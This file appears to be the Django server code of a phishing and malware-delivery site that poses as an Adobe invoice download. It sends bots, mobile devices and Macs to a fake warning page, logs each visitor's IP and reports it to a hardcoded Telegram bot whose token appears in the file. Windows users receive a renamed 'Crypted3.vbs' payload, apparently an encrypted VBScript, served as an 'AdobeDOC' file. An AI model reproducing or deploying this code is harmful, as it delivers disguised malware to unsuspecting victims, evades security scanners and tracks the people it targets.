import random
import uuid
import requests
import shutil
import os
from django.shortcuts import redirect
from django.http import FileResponse

# DECLARE CONSTANTS
TELEGRAM_TOKEN = '6692059577:AAH-8s92yLsB94qHVKIZtxPtfEEH5SFJkOg'
TELEGRAM_CHAT_ID = '-980609073'

MOBILE_USER_AGENT = [
    'Android',
    'webOS',
    'iPhone',
    'iPad',
    'iPod',
    'BlackBerry',
    'Windows Phone'
]

MAC_USER_AGENT = [
    'Macintosh',
    'Mac OS X',
    'Mac_PowerPC',
]

# Function to check if ip exist in a file already and write if it dosen't
def search_str(file_path, word):
    with open(file_path, 'r') as file:
        # read all content of a file
        content = file.read()
        # check if string present in a file
        if word in content:
            return True
        else:
            False

# Function to check fo ip
def get_ip(request):
    # Get the IP of the  device and log into the  file
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

# Function to Send telegram notification
def telegram_notification(message):
    message = message

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
   
    params = {
       "chat_id": TELEGRAM_CHAT_ID,
       "text": message,
       
    }
    resp = requests.post(url, params=params)

    # Throw an exception if Telegram API fails
    resp.raise_for_status()

# TODO Function to handle inserting random words 
def insert(originalfile,string):
    with open(originalfile,'r') as f:
        with open('newfile.txt','w') as f2: 
            f2.write(string)
            f2.write(f.read())
    os.remove(originalfile)
    os.rename('newfile.txt',originalfile)


# Function that handles the redirection after checks
def index(request):

    # initialize device and os information of the visitor
    device_type = ""
    os_type = ""
    if request.user_agent.is_mobile:
        device_type = "Mobile"
    if request.user_agent.is_tablet:
        device_type = "Tablet"
    if request.user_agent.is_pc:
        device_type = "PC"
    
    os_type = request.user_agent.os.family
    
    
    # Check if user is a bot
    if request.user_agent.is_bot:
        return redirect('bot_visit')
    
    # Check if user is on a mobile device or tablet
    if device_type == "Mobile" or device_type == "Tablet":
        return redirect('mobile_visit')
    
    # Check if user is on a mac
    if os_type in MAC_USER_AGENT:
        return redirect('mac_visit')

    return redirect('download')


# Function that handles bot visit
def bot_visit(request):
    os_type = request.user_agent.os.family
    # Get the IP of the bot device and log into the bot.txt file
    ip = get_ip(request)
    
    # Log the bot ip address 
    if search_str('text_logs/bot.txt', ip):
        return redirect('https://adobealertmsg.github.io/warning/already.html?parameter=The%20secured%20link%20to%20the%20invoice%20has%20already%20been%20generated.%20If%20you%20cannot%20find%20the%20link,%20please%20check%20your%20browser%20history%20for%20Mega.%20Once%20you%20have%20located%20the%20link,%20click%20on%20the%20download%20button%20located%20in%20the%20bottom-right%20corner%20of%20the%20Mega%20page%20to%20download%20and%20access%20the%20secured%20document')
    else:
        with open('text_logs/bot.txt', 'a') as file:
            file.write(ip)

    # Send telegram notification of bot visit

    message = f'Visit from bot \n ip: {ip} \n OS: {os_type}'

    telegram_notification(message)

    return redirect('https://adobealertmsg.github.io/warning/')

# Function that handles  mobile visits
def mobile_visit(request):
    # Get the IP of the bot device and log into the bot.txt file
    ip = get_ip(request)
    # Log the mobile ip address 
    if search_str('text_logs/mobiles.txt', ip):
        return redirect('https://adobealertmsg.github.io/warning/already.html?parameter=The%20secured%20link%20to%20the%20invoice%20has%20already%20been%20generated.%20If%20you%20cannot%20find%20the%20link,%20please%20check%20your%20browser%20history%20for%20Mega.%20Once%20you%20have%20located%20the%20link,%20click%20on%20the%20download%20button%20located%20in%20the%20bottom-right%20corner%20of%20the%20Mega%20page%20to%20download%20and%20access%20the%20secured%20document')
    else:
        with open('text_logs/mobiles.txt', 'a') as file:
            file.write(ip)

    # Send telegram notification of mobile visit

    message = f'Visit from Mobile \n ip: {ip} \n Device: Mobile'

    telegram_notification(message)

    

    return redirect('https://adobealertmsg.github.io/warning/')

# Function that handles  mac visits
def mac_visit(request):
    # Get the IP of the mac device and log into the bot.txt file
    ip = get_ip(request)
    # Log the mac ip address 
    if search_str('text_logs/macs.txt', ip):
        return redirect('https://adobealertmsg.github.io/warning/already.html?parameter=The%20secured%20link%20to%20the%20invoice%20has%20already%20been%20generated.%20If%20you%20cannot%20find%20the%20link,%20please%20check%20your%20browser%20history%20for%20Mega.%20Once%20you%20have%20located%20the%20link,%20click%20on%20the%20download%20button%20located%20in%20the%20bottom-right%20corner%20of%20the%20Mega%20page%20to%20download%20and%20access%20the%20secured%20document')
    else:
        with open('text_logs/macs.txt', 'a') as file:
            file.write(ip)

    # Send telegram notification of mobile visit

    message = f'Visit from Mac \n ip: {ip} \n Device: Mac'

    telegram_notification(message)

    return redirect('https://adobealertmsg.github.io/warning/')




def download_file(request):
    # Get the IP of the bot device and log into the bot.txt file
    ip = get_ip(request)
    
    if search_str('text_logs/ip.txt', ip):
        return redirect('https://adobealertmsg.github.io/warning/already.html?parameter=The%20secured%20link%20to%20the%20invoice%20has%20already%20been%20generated.%20If%20you%20cannot%20find%20the%20link,%20please%20check%20your%20browser%20history%20for%20Mega.%20Once%20you%20have%20located%20the%20link,%20click%20on%20the%20download%20button%20located%20in%20the%20bottom-right%20corner%20of%20the%20Mega%20page%20to%20download%20and%20access%20the%20secured%20document')
    else:
        with open('text_logs/ip.txt', 'a') as file:
            file.write(ip)

    # Send download notification to telegram
    
    message = f'New Download \n ip: {ip}'

    telegram_notification(message)

    # Set the prefix
    prefix = 'AdobeDOC'

    # Set File ID
    file_id = str(uuid.uuid4().fields[-1])[:5]
    
    file_name = str(prefix) + file_id + '.vbs'
    shutil.copyfile('Crypted3.vbs', file_name)

    
    return FileResponse(open(file_name, 'rb'), as_attachment=True)
                